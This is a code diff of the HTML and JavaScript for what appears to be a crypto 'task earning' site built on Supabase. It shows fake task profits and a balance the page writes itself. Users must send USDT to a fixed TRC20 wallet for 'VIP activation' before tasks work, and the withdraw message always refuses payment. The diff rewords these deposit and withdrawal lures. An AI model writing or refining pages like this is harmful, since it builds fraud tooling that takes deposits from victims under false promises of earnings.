@@ -20,7 +20,6 @@
         .btn-confirm { background: var(--primary); color: white; border: none; width: 100%; padding: 12px; border-radius: 8px; cursor: pointer; font-weight: bold; margin-top: 10px; }
         .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.8); align-items: center; justify-content: center; z-index: 3000; padding: 20px; }
         .modal-content { background: white; padding: 25px; border-radius: 20px; text-align: center; width: 100%; max-width: 400px; }
-        .lang-switch { position: absolute; top: 10px; right: 10px; background: transparent; color: white; border: 1px solid white; padding: 5px; border-radius: 4px; cursor: pointer; }
     </style>
 </head>
 <body>
@@ -33,9 +32,9 @@
             <button class="btn-confirm" style="background:#444;" onclick="handleAuth('signup')">Create Account</button>
         </div>
     </div>
+
     <div id="main-app">
         <div class="header">
-            <button class="lang-switch" onclick="toggleLang()">AR / EN</button>
             <div id="bal-text">Total Balance (USDT)</div>
             <div class="balance-val">$ <span id="balance">0.00</span></div>
             <div style="display:flex; gap:10px; margin-top:15px; justify-content:center;">
@@ -50,6 +49,7 @@
             </div>
         </div>
     </div>
+
     <div id="op-modal" class="modal">
         <div class="modal-content">
             <h3 id="modal-title"></h3>
@@ -57,61 +57,100 @@
             <button class="btn-confirm" onclick="closeModal()">Close</button>
         </div>
     </div>
+
 <script>
+    // بيانات الربط الخاصة بك
     const supabaseUrl = 'https://setalptyphrhbjcwmhoq.supabase.co';
     const supabaseKey = 'sb_publishable_P8QbHZQxsaAKYFTpQVU_Gw_1QU5DHas';
     const _supabase = supabase.createClient(supabaseUrl, supabaseKey);
-    let currentUser = null; let userData = {};
+
+    let currentUser = null;
+    let userData = {};
+
     async function handleAuth(type) {
         const email = document.getElementById('email').value;
         const password = document.getElementById('password').value;
-        const { data, error } = (type === 'signup') 
-            ? await _supabase.auth.signUp({ email, password })
-            : await _supabase.auth.signInWithPassword({ email, password });
-        if (error) alert(error.message);
-        else {
-            if(type === 'signup') {
-                await _supabase.from('profiles').insert([{ id: data.user.id, username: email.split('@')[0] }]);
-                alert("Account created! Now please Login.");
-            } else { loadAppData(data.user); }
+        
+        if (type === 'signup') {
+            const { data, error } = await _supabase.auth.signUp({ email, password });
+            if (error) alert("Error: " + error.message);
+            else alert("Account created! Please Login now.");
+        } else {
+            const { data, error } = await _supabase.auth.signInWithPassword({ email, password });
+            if (error) alert("Error: " + error.message);
+            else loadAppData(data.user);
         }
     }
+
     async function loadAppData(user) {
         currentUser = user;
-        const { data } = await _supabase.from('profiles').select('*').eq('id', user.id).single();
+        // جلب البيانات من جدول البروفايل
+        const { data, error } = await _supabase.from('profiles').select('*').eq('id', user.id).single();
+        
         if (data) {
             userData = data;
             document.getElementById('auth-screen').style.display = 'none';
             document.getElementById('main-app').style.display = 'block';
             updateUI();
+        } else {
+            console.log("No profile data yet, wait 2 seconds...");
+            setTimeout(() => loadAppData(user), 2000); // محاولة ثانية إذا كان الـ Trigger بطيئاً
         }
     }
+
     function renderTasks() {
         const list = document.getElementById('tasks-list');
         list.innerHTML = '';
-        if (userData.tasks_completed >= 10) { document.getElementById('day-finished').style.display = 'block'; return; }
+        if (userData.tasks_completed >= 10) { 
+            document.getElementById('day-finished').style.display = 'block'; 
+            return; 
+        }
         for (let i = userData.tasks_completed; i < 10; i++) {
-            list.innerHTML += `<div class="task-card"><div><h4>Task #${301 + i}</h4><span style="color:var(--green); font-weight:bold;">Profit: +$4.44</span><button class="btn-confirm" onclick="submitTask(${i})">Submit</button></div></div>`;
+            list.innerHTML += `
+                <div class="task-card">
+                    <div>
+                        <h4>Task #${301 + i}</h4>
+                        <span style="color:var(--green); font-weight:bold;">Profit: +$4.44</span>
+                        <button class="btn-confirm" onclick="submitTask(${i})">Submit</button>
+                    </div>
+                </div>`;
         }
     }
+
     async function submitTask(id) {
-        if (!userData.is_vip) { showModal('deposit'); return; }
+        if (!userData.is_vip) { 
+            showModal('deposit'); 
+            return; 
+        }
         const newBal = userData.balance + 4.44;
         const newCount = userData.tasks_completed + 1;
         const { error } = await _supabase.from('profiles').update({ balance: newBal, tasks_completed: newCount }).eq('id', currentUser.id);
-        if(!error) { userData.balance = newBal; userData.tasks_completed = newCount; updateUI(); }
+        if(!error) { 
+            userData.balance = newBal; 
+            userData.tasks_completed = newCount; 
+            updateUI(); 
+        }
     }
-    function updateUI() { document.getElementById('balance').innerText = userData.balance.toFixed(2); renderTasks(); }
+
+    function updateUI() { 
+        document.getElementById('balance').innerText = userData.balance.toFixed(2); 
+        renderTasks(); 
+    }
+
     function showModal(type) {
         document.getElementById('op-modal').style.display = 'flex';
-        const title = document.getElementById('modal-title'); const body = document.getElementById('modal-body');
+        const title = document.getElementById('modal-title');
+        const body = document.getElementById('modal-body');
         if(type === 'deposit') {
-            title.innerText = "VIP Deposit";
-            body.innerHTML = "Send USDT (TRC20) to:<br><b>TG9gT1pPJK3aETRp1hVu28F5Zayu4oVyEg</b>";
-        } else { title.innerText = "Withdraw"; body.innerText = "Locked. Cycle not finished."; }
+            title.innerText = "VIP Activation Required";
+            body.innerHTML = "To start tasks, please deposit USDT (TRC20) to:<br><br><b style='color:var(--primary)'>TG9gT1pPJK3aETRp1hVu28F5Zayu4oVyEg</b><br><br>After payment, contact support.";
+        } else { 
+            title.innerText = "Withdraw"; 
+            body.innerText = "Minimum withdraw $100. Complete your tasks first."; 
+        }
     }
+
     function closeModal() { document.getElementById('op-modal').style.display = 'none'; }
-    function toggleLang() { /* Language Toggle Logic */ }
 </script>
 </body>
 </html>
